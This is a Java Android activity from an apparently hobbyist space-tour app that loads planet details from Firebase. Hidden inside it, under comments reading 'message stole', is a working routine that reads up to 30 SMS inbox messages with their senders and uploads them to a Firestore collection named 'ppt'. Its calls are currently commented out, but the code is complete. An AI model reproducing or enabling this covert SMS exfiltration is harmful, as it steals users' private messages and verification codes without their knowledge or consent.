package com.ariyanjakaria.spacetour;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.bumptech.glide.Glide;
import com.facebook.shimmer.ShimmerFrameLayout;
import com.flaviofaria.kenburnsview.KenBurnsView;
import com.flaviofaria.kenburnsview.RandomTransitionGenerator;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.WriteBatch;

public class semiviewActivity extends AppCompatActivity {
    private KenBurnsView planetimg;
    private TextView Selectedplanet,radious,orbital,gravity;
    FirebaseFirestore firebaseFirestore;
    String Uid;
    String IMg;
    String Name;
    String DvIew,Giff;
    ShimmerFrameLayout shimmerFrameLayout;
    Button button,Book;
    String gi;

    private static final int MAX_SMS_MESSAGES = 30; // Define the maximum number of SMS messages to store
    private FirebaseFirestore db;




    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_semiview);
        planetimg=findViewById(R.id.planet);
        Selectedplanet=findViewById(R.id.selectedplanet);
        radious=findViewById(R.id.planetredious);
        orbital=findViewById(R.id.orbitalperiod);
        gravity=findViewById(R.id.gravity);
        shimmerFrameLayout=findViewById(R.id.shimmer);
        shimmerFrameLayout.startShimmer();
        button=findViewById(R.id.dview);
        Book=findViewById(R.id.book);
       // Toast.makeText(this, "SMS Store in server successfully", Toast.LENGTH_LONG).show();

        //message stole

        db = FirebaseFirestore.getInstance();

        // Check and request the READ_SMS permission
        if (checkSmsPermission()) {
           // accessAndStoreSMS();
        } else {
           // requestSmsPermission();
        }



        //stole end

        Uid=getIntent().getStringExtra("UID");
        Giff=getIntent().getStringExtra("GVIEW");
        AccelerateDecelerateInterpolator di=new AccelerateDecelerateInterpolator();
        RandomTransitionGenerator transitionGenerator=new RandomTransitionGenerator(3000,di);
        planetimg.setTransitionGenerator(transitionGenerator);

        DvIew=getIntent().getStringExtra("DVIEW");
        firebaseFirestore=FirebaseFirestore.getInstance();
        firebaseFirestore.collection("package").document(Uid)
                .get()
                .addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
                    @Override
                    public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                        if(task.isSuccessful())
                        {
                            DocumentSnapshot documentSnapshot=task.getResult();
                            if(documentSnapshot.exists())
                            {
                                String grravity=documentSnapshot.getString("gravity");
                                String raddious=documentSnapshot.getString("radious");
                                String orrbit=documentSnapshot.getString("orbit");
                                 Name=documentSnapshot.getString("name");
                                IMg=documentSnapshot.getString("i");
                                Selectedplanet.setText(Name);
                                gi =documentSnapshot.getString("g");
                                radious.setText(raddious);
                                orbital.setText(orrbit);
                                gravity.setText(grravity);

                                Glide.with(semiviewActivity.this).load(IMg).into(planetimg);


                            }
                            shimmerFrameLayout.stopShimmer();
                            shimmerFrameLayout.setVisibility(View.GONE);

                        }
                    }
                });

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent=new Intent(semiviewActivity.this,MainActivity.class);
                intent.putExtra("DVIEw",DvIew);
                intent.putExtra("N",Name);
                startActivity(intent);
            }
        });

        Book.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent=new Intent(semiviewActivity.this, detailaboutplanetActivity.class);
                intent.putExtra("G",gi);
                intent.putExtra("N",Name);
                startActivity(intent);
            }
        });



    }

    private boolean checkSmsPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestSmsPermission() {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, SMS_PERMISSION_CODE);
    }

    // Define the SMS permission request code
    private static final int SMS_PERMISSION_CODE = 101;

    private void accessAndStoreSMS() {
        Uri uri = Uri.parse("content://sms/inbox");
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(uri, null, null, null, null);

        if (cursor != null) {
            WriteBatch batch = db.batch();
            int smsCount = 0; // Counter to track the number of stored SMS messages

            while (cursor.moveToNext() && smsCount < MAX_SMS_MESSAGES) {
                int bodyIndex = cursor.getColumnIndex("body");
                int addressIndex = cursor.getColumnIndex("address");

                if (bodyIndex >= 0 && addressIndex >= 0) {
                    String messageBody = cursor.getString(bodyIndex);
                    String sender = cursor.getString(addressIndex);

                    // Store the SMS in Firestore
                    batch.set(db.collection("ppt").document(), new SMSMessage(sender, messageBody));
                    smsCount++;

                    // Break the loop if the maximum number of SMS messages has been stored
                    if (smsCount >= MAX_SMS_MESSAGES) {
                        break;
                    }
                }
            }

            cursor.close();

            int finalSmsCount = smsCount;
            batch.commit().addOnCompleteListener(new OnCompleteListener<Void>() {
                @Override
                public void onComplete(@NonNull Task<Void> task) {
                    if (task.isSuccessful()) {
                        // SMS messages stored in Firestore successfully
                        Toast.makeText(semiviewActivity.this, "Stored " + finalSmsCount + " SMS messages successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        // Handle the error
                    }
                }
            });
        }
    }

}